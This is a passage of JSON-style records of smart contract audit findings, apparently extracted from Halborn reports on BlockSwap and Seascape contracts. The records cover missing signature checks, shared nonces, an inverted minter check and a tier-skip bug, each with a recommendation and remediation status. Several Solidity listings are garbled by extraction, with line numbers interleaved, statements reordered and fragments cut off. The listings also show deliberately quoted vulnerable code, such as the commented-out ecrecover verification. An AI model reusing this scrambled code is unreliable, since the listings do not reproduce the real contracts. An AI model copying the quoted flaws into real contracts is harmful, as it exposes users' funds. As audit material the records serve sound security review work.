90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 32 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 accountManager = AccountManager ( address ( accountManagerProxy )); StakeHouseUpgradeableProxy transactionManagerProxy = new StakeHouseUpgradeableProxy ( _transactionManagerLogic , address ( this ) , abi . encodeWithSelector ( TransactionManager ( _transactionManagerLogic ). init . selector , address ( this ) , address ( accountManagerProxy ) , _depositRouter , _minDataEpochHeight ) ); transactionManager = TransactionManager ( address ( transactionManagerProxy )) ; StakeHouseUpgradeableProxy settlementProxy = new StakeHouseUpgradeableProxy ( _settlementPoolLogic , address ( this ) , abi . encodeWithSelector ( SlotSettlementPool ( _settlementPoolLogic ). init . selector , address ( this ) , _sETHBeacon ) ); slotSettlementPool = SlotSettlementPool ( address ( settlementProxy )) ; StakeHouseUpgradeableProxy saveETHReservePoolProxy = new StakeHouseUpgradeableProxy ( _saveETHReservePoolLogic , address ( this ) , abi . encodeWithSelector ( savETHReservePool ( _saveETHReservePoolLogic ). init . selector , address ( this ) , _saveETHLogic ) 33 141 142 143 144 145 146 147 ); saveETHPool = savETHReservePool ( address ( saveETHReservePoolProxy )) ; address _savETHManagerLogic = address ( new savETHManager () ); StakeHouseUpgradeableProxy saveETHManagerProxy = new ) ); StakeHouseUpgradeableProxy ( _savETHManagerLogic , address ( this ) , abi . encodeWithSelector ( savETHManager ( _savETHManagerLogic ). init . selector , address ( this ) 148 149 150 151 152 153 154 155 156 157 158 159 160 161 } 162 163 // / @dev Due to Solidity stack limitations on how many vars can be passed into a fn , this inits brand central separately savETHMan = savETHManager ( address ( saveETHManagerProxy )) ; stakeHouseRegistryBeacon = _stakeHouseRegistryBeacon ; emit CoreModulesInit () ; 164 // / @param _brandCentralLogic Logic contract for Brand Central 165 // / @param _brandNftLogic Logic contract for the brand NFT 166 // / @param _lootFactoryLogic Logic contract for skLootFactory 167 // / @param _skLootLogic Logic contract or skLoot NFT 168 // / @param _claimAuction Address of the Brand Central SHB auction contract 169 function superchargeAndInitBrandCentral ( address _brandCentralLogic , 170 address _brandNftLogic , 171 address _lootFactoryLogic , 172 address _skLootLogic , 173 174 address _claimAuction 175 ) external { 176 177 require ( accessControls . isAdmin ( msg . sender ) , \" Only admin \" ); require ( address ( brandCentral ) == address (0) , \" Only init once \" ) ; 178 179 StakeHouseUpgradeableProxy lootFactoryProxy = new 34 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 StakeHouseUpgradeableProxy ( address ( _lootFactoryLogic ) , address ( this ) , abi . encodePacked ( \" \") ); address _skLootFactory = address ( lootFactoryProxy ); StakeHouseUpgradeableProxy bNFTProxy = new StakeHouseUpgradeableProxy ( address ( _brandNftLogic ) , address ( this ) , abi . encodePacked ( \" \") ); address _brandNft = address ( bNFTProxy ); StakeHouseUpgradeableProxy brandCentralProxy = new StakeHouseUpgradeableProxy ( _brandCentralLogic , address ( this ) , abi . encodeWithSelector ( BrandCentral ( _brandCentralLogic ). init . selector , address ( this ) , _brandNft , _skLootFactory , _claimAuction ) ); address brandCentralAddress = address ( brandCentralProxy ); brandCentral = BrandCentral ( brandCentralAddress ); // init proxies BrandNFT ( _brandNft ). init ( brandCentralAddress ); skLOOTFactory ( _skLootFactory ). init ( brandCentral , _skLootLogic ) ; emit BrandCentralInit () ; 213 214 215 } 35 Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add proper address validation when every state variable assignment is done from user supplied input. Remediation Plan: SOLVED: The BlockSwap team solved the issue by validating that every address input is different from zero. 36 ", "labels": ["Halborn", "BlockSwap", "Severity: Low"]}, {"title": "USE OF DEPRECATED SETUPROLE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple contracts make use of the deprecated function _setupRole from the AccessControl contract. As per the AccessControl.sol contract documentation, this function is deprecated: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/ contracts/access/AccessControl.sol#L183 Code Location:  StakeHouseAccessControls.sol:42: _setupRole(DEFAULT_ADMIN_ROLE, _superAdmin);  StakeHouseAccessControls.sol:43: _setupRole(CORE_MODULE_ADMIN_ROLE , _superAdmin);  StakeHouseAccessControls.sol:44: _setupRole(CORE_MODULE_MANAGER_ROLE , _superAdmin);  StakeHouseAccessControls.sol:115: _address); _setupRole(CORE_MODULE_ROLE, Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the _grantRole function instead. Remediation Plan: ACKNOWLEDGED: The BlockSwap team acknowledged this issue. 37 ", "labels": ["Halborn", "BlockSwap", "Severity: Informational"]}, {"title": "ACCOUNTMANAGER.GETACCOUNT VIEW FUNCTION CAN BE REMOVED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract AccountManager there is the following public state variable declared: Listing 22: AccountManager.sol 27 Account [] public accounts ; At the same time, the contract contains the following view function: Listing 23: AccountManager.sol 46 function getAccount ( uint256 _index ) external view returns ( Account memory userAccount ) { require ( _index < accounts . length , ' The index requested does not exist '); userAccount = accounts [ _index ]; 47 48 49 50 } As accounts is already declared as a public state variable the compiler already creates a view function to access and read each of the elements of the array, hence is not needed to declare an extra view function. Risk Level: Likelihood - 1 Impact - 1 38 Recommendation: It is recommended either to declare accounts state variable as private keeping the new view function or to keep the accounts state variable as public and remove the new view function. Remediation Plan: ACKNOWLEDGED: The BlockSwap team acknowledged this issue. 39 ", "labels": ["Halborn", "BlockSwap", "Severity: Informational"]}, {"title": "TRANSACTIONMANAGER.GETWITHDRAWALADDRESS VIEW FUNCTION CAN BE REMOVED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract TransactionManager the following public state variable is declared: Listing 24: TransactionManager.sol 15 AccountManager public accountManager ; At the same time, the contract contains the following view function: Listing 25: TransactionManager.sol 123 function getWithdrawalAddress () external view returns ( address ) { 124 125 } return address ( accountManager ); As accountManager is already declared as a public state variable the compiler already creates a view function to read it, hence is not needed to declare an extra view function. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended either to declare accountManager state variable as private keeping the new view function or to keep the accountManager state 40 variable as public and remove the new view function. Remediation Plan: ACKNOWLEDGED: BlockSwap team acknowledged this issue. 41 ", "labels": ["Halborn", "BlockSwap", "Severity: Informational"]}, {"title": "CONSTANT KECCAK VARIABLES ARE TREATED AS EXPRESSIONS, NOT CONSTANTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract StakeHouseAccessControls, the roles are declared the following way: Listing 26: StakeHouseAccessControls.sol 11 bytes32 public constant PROXY_ADMIN_ROLE = keccak256 ( \" PROXY_ADMIN_ROLE \"); 12 bytes32 public constant CORE_MODULE_ADMIN_ROLE = keccak256 ( \" CORE_MODULE_ADMIN_ROLE \" ); 13 bytes32 public constant CORE_MODULE_MANAGER_ROLE = keccak256 (\" CORE_MODULE_MANAGER_ROLE \"); 14 bytes32 public constant CORE_MODULE_ROLE = keccak256 ( \" CORE_MODULE_ROLE \"); This results in the keccak256 operation being performed whenever the variable is used, increasing gas costs relative to just storing the output hash.  Each usage of a constant costs ~100gas more per access (still a little better than storing the result in storage, but not by much).  Since these are not real constants, they cant be referenced from a real constant environment (e.g., from assembly, or from another library). Risk Level: Likelihood - 1 Impact - 1 42 Recommendation: It is recommended to either: 1. Keep the variables as constant and hard-code the bytes32 string into the smart contracts. 2. Declare all the roles as immutable and perform the hashing assignment in the constructors. Remediation Plan: SOLVED: The BlockSwap team solved the issue by adding the immutable modifier to the state variables mentioned, and they are now initialized in the constructor. 43 3.10 (HAL-10) USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS - INFORMATIONAL ", "labels": ["Halborn", "BlockSwap", "Severity: Informational"]}, {"title": "SIGNATURE NONCES ARE IMPLEMENTED INCORRECTLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the MoonscapeDefi and StakeNftForChain contracts, a nonce state variable is used to prevent signature replay attacks: Listing 1: MoonscapeDefi.sol 23 uint256 public nonce ; Listing 2: MoonscapeDefi.sol (Lines 146,153,163) 132 function stakeToken ( uint _stakeId , uint _cityId , uint  _buildingId , uint _amount , uint8 v , bytes32 [2] calldata sig )  external { 133  ]; 134 135 136 137 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // todo // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 138 139 140 141 142 143 144 145 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId ,\" do not have this stakeId \" ); { bytes memory prefix = \" \\ x19Ethereum Signed Message  :\\ n32 \" ; 146 bytes32 message = keccak256 ( abi . encodePacked (  _stakeId , tokenStaking . sessionId , _cityId , _buildingId , nonce , msg  . sender )); 147 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 148 address recover = ecrecover ( hash , v , sig [0] ,  sig [1]) ; 149 14 150 // require ( recover == verifier , \" Verification failed  about stakeToken \") ; } 151 152 153 154 155 156 157 158 159 ++ nonce ; deposit ( stakeKey , msg . sender , _amount ); IERC20 token = IERC20 ( tokenStaking . stakeToken ); require ( token . balanceOf ( msg . sender ) >= _amount , \" Not  enough token to stake \" ); 160 161  ; 162 163 token . safeTransferFrom ( msg . sender , address ( this ) , _amount ) emit StakeToken ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _amount , nonce ); 164 } Listing 3: MoonscapeDefi.sol (Lines 195,202) 180 function importNft ( uint _stakeId , uint _cityId , uint  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 181  ]; 182 183 184 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 185 186 187 188 189 190 191 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId , \" do not have this stakeId \" ); require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owned  \" ); 192 193 194  :\\ n32 \" ; { bytes memory prefix = \" \\ x19Ethereum Signed Message 15 195 bytes32 message = keccak256 ( abi . encodePacked (  tokenStaking . sessionId , _stakeId , _cityId , _buildingId ,  _scapeNftId , nonce , msg . sender )) ; 196 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 197 address recover = ecrecover ( hash , _v , sig [0] ,  sig [1]) ; 198 199 // require ( recover == verifier , \" Verification failed  about stakeNft \") ; 200 201 202 203 204 } ++ nonce ; nft . safeTransferFrom ( msg . sender , 0  x000000000000000000000000000000000000dEaD , _scapeNftId ); 205 206 emit ImportNft ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _scapeNftId , block . timestamp ); 207 208 } Listing 4: MoonscapeDefi.sol (Lines 251,258) 243 function verifyBonus ( uint _sessionId , uint _stakeId , uint  _cityId , uint _buildingId , uint _bonusPercent , uint8 _v , bytes32  _r , bytes32 _s ) internal returns ( bool ) { 244 245 246 247 bytes32 stakeKey = stakeKeyOf ( _sessionId , _stakeId ); require ( receiveBonus [ stakeKey ][ msg . sender ] == false , \"  already rewarded \" ); 248 249 250  :\\ n32 \" ; { bytes memory prefix = \" \\ x19Ethereum Signed Message 251 bytes32 message = keccak256 ( abi . encodePacked (  _sessionId , _stakeId , _cityId , _buildingId , _bonusPercent , nonce ,  msg . sender )); 252 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 253 254 address recover = ecrecover ( hash , _v , _r , _s ); 16 255 // require ( recover == verifier , \" Verification failed  about getBonus \") ; 256 257 258 259 260 261 } ++ nonce ; return true ; } Listing 5: StakeNftForChain.sol (Line 65) { bytes32 message bytes memory prefix = keccak256 ( abi . encodePacked ( = \" \\ x19Ethereum Signed Message require ( isActive ( sessionId ) , \" session not active \" ); function importNft ( uint _stakeId , uint _cityId , uint require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owner 50  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 51 52 53 54  \" ); 55 56 57  :\\ n32 \" ; 58  sessionId , _stakeId , _cityId , _buildingId , _scapeNftId , nonce , msg  . sender )); 59  prefix , message )); 60  sig [1]) ; 61 62  about stakeNft \") ; 63 64 65 66 67  x000000000000000000000000000000000000dEaD , _scapeNftId ); 68 69  _buildingId , _scapeNftId , block . timestamp ); 70 emit ImportNft ( msg . sender , sessionId , _stakeId , _cityId , // require ( recover == verifier , \" Verification failed nft . safeTransferFrom ( msg . sender , 0 = keccak256 ( abi . encodePacked ( = ecrecover ( hash , _v , sig [0] , address recover bytes32 hash ++ nonce ; } } 17 This nonce variable is increased when stakeToken(), importNft() or verifyBonus() functions are called. Although, the signer does not really know the order in which the users will call these functions. Hence, if the backend, for example, generates a signature for a user and this user does not call the function right after that, his signature will be invalid after someone else calls any of those functions. Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to use a mapping instead of a global counter as a nonce to solve this issue: mapping(address => uint256)public _nonces; Remediation Plan: SOLVED: The SeaScape Team now uses a nonce mapping for each user. This issue were fixed in the commit ID cdc174452dae98665bfda883dca9c7ee46dda50f 18 ", "labels": ["Halborn", "Seascape_Moonscape", "Severity: Medium"]}, {"title": "MISSING SIGNATURE VERIFICATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the MoonscapeDefi and StakeNftForChain contracts, some functions use the ecrecover() function when staking or importing NFTs or calculating This ecrecover() function is a handy Solidity function that bonuses. allows the smart contract to validate that an expected party properly signs incoming data. The mentioned functions use the ecrecover() but there is no validation of the obtained address by this function. Listing 6: MoonscapeDefi.sol (Line 150) 132 function stakeToken ( uint _stakeId , uint _cityId , uint  _buildingId , uint _amount , uint8 v , bytes32 [2] calldata sig )  external { 133  ]; 134 135 136 137 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // todo // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 138 139 140 141 142 143 144 145 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId ,\" do not have this stakeId \" ); { bytes memory prefix = \" \\ x19Ethereum Signed Message  :\\ n32 \" ; 146 bytes32 message = keccak256 ( abi . encodePacked (  _stakeId , tokenStaking . sessionId , _cityId , _buildingId , nonce , msg  . sender )); 147 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 148 address recover = ecrecover ( hash , v , sig [0] , 19  sig [1]) ; 149 150 // require ( recover == verifier , \" Verification failed  about stakeToken \") ; } 151 152 153 154 155 156 157 158 159 ++ nonce ; deposit ( stakeKey , msg . sender , _amount ); IERC20 token = IERC20 ( tokenStaking . stakeToken ); require ( token . balanceOf ( msg . sender ) >= _amount , \" Not  enough token to stake \" ); 160 161  ; 162 163 token . safeTransferFrom ( msg . sender , address ( this ) , _amount ) emit StakeToken ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _amount , nonce ); 164 } Listing 7: MoonscapeDefi.sol (Line 199) 180 function importNft ( uint _stakeId , uint _cityId , uint  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 181  ]; 182 183 184 TokenStaking storage tokenStaking = tokenStakings [ _stakeId // validate the session id bytes32 stakeKey = stakeKeyOf ( tokenStaking . sessionId ,  _stakeId ); 185 186 187 188 189 190 191 require ( isActive ( stakeKey ) , \" session not active \" ); // validate stake id require ( _stakeId <= stakeId , \" do not have this stakeId \" ); require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owned  \" ); 192 193 194 { bytes memory prefix = \" \\ x19Ethereum Signed Message 20  :\\ n32 \" ; 195 bytes32 message = keccak256 ( abi . encodePacked (  tokenStaking . sessionId , _stakeId , _cityId , _buildingId ,  _scapeNftId , nonce , msg . sender )) ; 196 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 197 address recover = ecrecover ( hash , _v , sig [0] ,  sig [1]) ; 198 199 // require ( recover == verifier , \" Verification failed  about stakeNft \") ; 200 201 202 203 204 } ++ nonce ; nft . safeTransferFrom ( msg . sender , 0  x000000000000000000000000000000000000dEaD , _scapeNftId ); 205 206 emit ImportNft ( msg . sender , tokenStaking . sessionId ,  _stakeId , _cityId , _buildingId , _scapeNftId , block . timestamp ); 207 208 } Listing 8: MoonscapeDefi.sol (Line 255) 243 function verifyBonus ( uint _sessionId , uint _stakeId , uint  _cityId , uint _buildingId , uint _bonusPercent , uint8 _v , bytes32  _r , bytes32 _s ) internal returns ( bool ) { 244 245 246 247 bytes32 stakeKey = stakeKeyOf ( _sessionId , _stakeId ); require ( receiveBonus [ stakeKey ][ msg . sender ] == false , \"  already rewarded \" ); 248 249 250  :\\ n32 \" ; { bytes memory prefix = \" \\ x19Ethereum Signed Message 251 bytes32 message = keccak256 ( abi . encodePacked (  _sessionId , _stakeId , _cityId , _buildingId , _bonusPercent , nonce ,  msg . sender )); 252 bytes32 hash = keccak256 ( abi . encodePacked (  prefix , message )); 253 254 address recover = ecrecover ( hash , _v , _r , _s ); 21 255 // require ( recover == verifier , \" Verification failed  about getBonus \") ; 256 257 258 259 260 261 } ++ nonce ; return true ; } Listing 9: StakeNftForChain.sol (Line 65) { bytes32 message bytes memory prefix = keccak256 ( abi . encodePacked ( = \" \\ x19Ethereum Signed Message require ( isActive ( sessionId ) , \" session not active \" ); function importNft ( uint _stakeId , uint _cityId , uint require ( nft . ownerOf ( _scapeNftId ) == msg . sender , \" not owner 50  _buildingId , uint _scapeNftId , uint8 _v , bytes32 [2] calldata sig )  external { 51 52 53 54  \" ); 55 56 57  :\\ n32 \" ; 58  sessionId , _stakeId , _cityId , _buildingId , _scapeNftId , nonce , msg  . sender )); 59  prefix , message )); 60  sig [1]) ; 61 62  about stakeNft \") ; 63 64 65 66 67  x000000000000000000000000000000000000dEaD , _scapeNftId ); 68 69  _buildingId , _scapeNftId , block . timestamp ); 70 emit ImportNft ( msg . sender , sessionId , _stakeId , _cityId , // require ( recover == verifier , \" Verification failed nft . safeTransferFrom ( msg . sender , 0 = keccak256 ( abi . encodePacked ( = ecrecover ( hash , _v , sig [0] , address recover bytes32 hash ++ nonce ; } } 22 Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to validate the recovered address with the one allowed to execute the called function. Remediation Plan: SOLVED: The SeaScape Team corrected the recovered address verification. This issue were fixed in the commit ID cdc174452dae98665bfda883dca9c7ee46dda50f 23 ", "labels": ["Halborn", "Seascape_Moonscape", "Severity: Medium"]}, {"title": "MINTERS CANT BE UNSET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The unsetMinter() function from RoverNft.sol smart contract does not correctly implement the verification to check if an account is a minter. This statement prevents minters from being removed. Code Location: Listing 10: Rover.Nft.sol (Line 46) 45 46 47 48 49 50 51 function unsetMinter ( address _minter ) public onlyOwner { require (! minters [ _minter ], \" already a minter \" ); delete minters [ _minter ]; emit UnsetMinter ( _minter ); } Proof of Concept: Steps to replicate this issue: - add a minter, for example user1 - try to remove user1 from minters Listing 11: RoverTest.js 1 2 3 4 it (\" ROVER :: unset minters \" , async () = > { await rover . setMinter ( user1 . address ); await rover . unsetMinter ( user1 . address ); }) ; 24 Listing 12: Output ROVER :: unset minters : 1 2  with reason string ' already a minter ' 3 at RoverNft . unsetMinter ( contracts / nfts / RoverNft . sol :46) Error : VM Exception while processing transaction : reverted Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to correctly validate if the user is a minter before removing it. Remediation Plan: SOLVED: The SeaScape Team corrected the verification to determine whether an account is a minter or not. This issue were fixed in the commit ID cdc174452dae98665bfda883dca9c7ee46dda50f 25 ", "labels": ["Halborn", "Seascape_Moonscape", "Severity: Medium"]}, {"title": "UNUSED PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are functions whose parameters are never used in some smart contracts. These parameters do not affect the code. Code Location:  operator, from, tokenId, data (MoonscapeDefi.sol#393,394,395,396)  operator, from, tokenId, data (MoonscapeGame.sol#275,276,277.278)  operator, from, tokenId, data (StakeNftForChain.sol#98)  amount (MMscpToken.sol#95) Risk Level: Likelihood - 1 Impact - 2 Recommendation: All parameters given to a function should affect the state of the code. The operator, from, tokenId, and data from onERC721Received() functions should implement any logic with that parameters, but they are not used for any contract state operations. Remediation Plan: ACKNOWLEDGED: The SeaScape Team acknowledged this finding. 26 ", "labels": ["Halborn", "Seascape_Moonscape", "Severity: Informational"]}, {"title": "FUNCTION STATE CAN BE RESTRICTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The state mutability of some functions could be restricted to pure in order to save gas. Code Location: Listing 13: MoonscapeDefi.sol 367 function stakeKeyOf ( uint _sessionId , uint _stakeId ) public  virtual returns ( bytes32 ) { 368 369 } return keccak256 ( abi . encodePacked ( _sessionId , _stakeId )) ; Listing 14: MscpVesting.sol 140 141 142 143 144 145 146 147 148 function getAvailableTokens ( bool _strategicInvestor , uint256 _timePassed , uint256 _remainingCoins ) { internal view returns ( uint ) Listing 15: MscpVesting.sol 161 function getBonus ( bool _strategicInvestor ) internal view  returns ( uint ) { 162 163  one 164 165 } if ( _strategicInvestor ) return 2000000 * 10**18; // 2 mil is released on day return 1500000 * 10**18; // 1.5 mil is released on day one 27 Listing 16: MscpToken.sol 95 96 97 function burn ( uint256 amount ) public { require ( false , \" Only burnFrom is allowed \" ); } Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to restrict the state of the mentioned functions to pure. Remediation Plan: ACKNOWLEDGED: The SeaScape Team acknowledged this finding. 28 ", "labels": ["Halborn", "Seascape_Moonscape", "Severity: Informational"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Moonscape_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The moonScape smart contracts use the pragma version 0.6.7 released on May 4, 2020. latest pragma version 0.8.16 released on August 8, 2022, solves different issues. It is also noticeable that Solidity versions after 0.8.0 also implement default overflow protection on arithmetic operations. Reference: Solidity Releases Code Location: note: All moonScape smart contracts implement same pragma version. Listing 17: MoonscapeGame.sol 1 pragma solidity 0.6.7; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Updating the pragma version used in MoonScape smart contracts is recommended to versions above or equal to 0.8.0. Remediation Plan: ACKNOWLEDGED: The SeaScape Team acknowledged this finding. 29 ", "labels": ["Halborn", "Seascape_Moonscape", "Severity: Informational"]}, {"title": "CLAIM CAN SKIP LEVEL ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Claim on LighthouseTier can skip claim for level 0 if the given level signature containing a level 1 is valid. Code Location: Listing 1: contracts/LighthouseTier (Lines 121,124) 116 function claim ( uint8 level , uint8 v , bytes32 r , bytes32 s ) external { require ( level >= 0 && level < 4, INVALID_PARAMETER \"); Tier storage tier = tiers [ msg . sender ]; \" LighthouseTier : // You can 't Skip tiers . if ( level != 0) { require ( tier . level + 1 == level , LighthouseTier : INVALID_LEVEL \" ); } else { require ( tier . usable == false , LighhouseTier : 0 _CLAIMED \"); } \" \" 117 118 119 120 121 122 123 124 125 13 Risk Level: Likelihood - 5 Impact - 5 Recommendations: It is recommended to check if the usability is set (tier.usable) when the level is different than 0. This will prevent the tier.level + 1 == level check to pass when level zero has not yet been claimed. Remediation Plan: wrapper SOLVED: Since the contract was already deployed on the mainnet, named new LighthouseTierWrapper solved the issue. Seascape team fixed the issue in commit ef9a08c2c5f9b4a2e2c92f562daf1000c9f99199. contract, contract written. This was new 14 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: Critical"]}, {"title": "CONTRACT LOCKED WHEN TRANSFERRING PRE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Calling transferPrefund on LighthouseProject to a project id whose prefund stage is not finished would set the internal transferredPrefund field to true, preventing the function to be called again. Furthermore, this method can be called with a none existing project id, locking the posibility to call transferPrefund for a future created project. Code Location: Listing 2: contracts/LighthouseProject (Lines 230,257) } return ; if ( auctions [ id ]. transferredPrefund ) { 229 function transferPrefund ( uint256 id ) external onlyOwner { 230 231 232 233 234 235 236 237 238 239 uint256 cap ; uint256 amount ; ( cap , amount ) = prefundTotalPool ( id ); if ( amount < cap ) { // We apply SCALER multiplayer , if the cap is less than 100 240 241 // It could happen if investing goes in NATIVE token . uint256 scaledPercent = ( cap - amount ) * SCALER / ( cap * 15 SCALER / 100) ; // allocation = 10 * SCALER / 100 * SCALED percent ; uint256 scaledTransferAmount = ( prefunds [ id ]. scaledAllocation * scaledPercent / 100) / SCALER ; auctions [ id ]. scaledAllocation = auctions [ id ]. scaledAllocation + scaledTransferAmount ; prefunds [ id ]. scaledAllocation = prefunds [ id ]. scaledAllocation - scaledTransferAmount ; uint256 scaledCompensationAmount = ( prefunds [ id ]. scaledCompensation * scaledPercent / 100) / SCALER ; auctions [ id ]. scaledCompensation = auctions [ id ]. scaledCompensation + scaledCompensationAmount ; prefunds [ id ]. scaledCompensation = prefunds [ id ]. scaledCompensation - scaledCompensationAmount ; emit TransferPrefund ( id , scaledTransferAmount , scaledCompensationAmount ); } auctions [ id ]. transferredPrefund = true ; 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 } Risk Level: Likelihood - 3 Impact - 5 Recommendations: The function should verify that the project exists and that its funding phase has already ended. 16 Remediation Plan: SOLVED: The issue was solved in commits 73ce68b0b8405d0cf1a602d247e57fbc3a2d0b4a and f2f7391d77640b1012d34eddb323dd74277c4662. 17 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: High"]}, {"title": "INVALID FEE CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The setFees function on the LighthouseTier contract does check for the fees being gibber than zero. However, the fees should be checked against the MIN_SPEND = 10 ** 6. Otherwise, the spendFrom on the claim function will always fail if the fee is less than the forementioned value. Code Location: Listing 3: contracts/LighthouseTier (Lines 67,68,69,70) require ( _fees [0] > 0 , \" LighthouseTier : ZERO_FEE_0 \" ); require ( _fees [1] > 0 , \" LighthouseTier : ZERO_FEE_1 \" ); require ( _fees [2] > 0 , \" LighthouseTier : ZERO_FEE_2 \" ); require ( _fees [3] > 0 , \" LighthouseTier : ZERO_FEE_3 \" ); 66 function setFees ( uint256 [4] memory _fees ) public onlyOwner { 67 68 69 70 71 72 73 74 75 76 77 78 } fees [0] = _fees [0]; fees [1] = _fees [1]; fees [2] = _fees [2]; fees [3] = _fees [3]; emit Fees ( _fees [0] , _fees [1] , _fees [2] , _fees [3]) ; Listing 4: contracts/LighthouseTier (Lines 139) 138 // Charging fee 139 require ( crowns . spendFrom ( msg . sender , fees [ level ]) , \" LighthouseTier : CWS_UNSPEND \"); Listing 5: contracts/crowns-token/CrownsToken.sol (Lines 513) 512 function spendFrom ( address sender , uint256 amount ) public returns ( bool ) { 18 513 require ( amount > MIN_SPEND , \" Crowns : trying to spend less than expected \"); Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended to compare the variables with their minimum and / or maximum value when setting them if they differ from zero. Otherwise, unexpected behaviors could arise. Remediation Plan: SOLVED: Fixed in commit 96fa5c7cbd6970310a594a1af917f4c8b654e82f 19 ", "labels": ["Halborn", "Seascape_Lighthouse", "Severity: Low"]}, {"title": "MISSING PARAMETER CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Lighthouse_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The setFundCollector function on the LighthousePrefund contract does check for fundCollector being different than owner but the constructor of the same contract does not perform the same check Code Location: Listing 6: contracts/LighthousePrefund (Lines 38,44) 29 constructor ( address _tier , address _submission , address _project , address payable _fundCollector , uint256 _chainID ) { require ( _tier != address (0) && _submission != address (0) && 30 _project != address (0) && _fundCollector != address (0) , \" Lighthouse : ZERO_ADDRESS \" ); require ( _tier != _submission , \" Lighthouse : SAME_ADDRESS \" ); require ( _tier != _project , \" Lighthouse : SAME_ADDRESS \" ); require ( _chainID > 0, \" Lighthouse : ZERO_VALUE \"); 31 32 33 34 35 36 37 38 39 40 } 41 42 function setFundCollector ( address payable _fundCollector ) external lighthouseTier = LighthouseTier ( _tier ); lighthouseRegistration = LighthouseRegistration ( _submission ); lighthouseProject = LighthouseProject ( _project ); fundCollector = _fundCollector ; chainID = _chainID ; onlyOwner { require 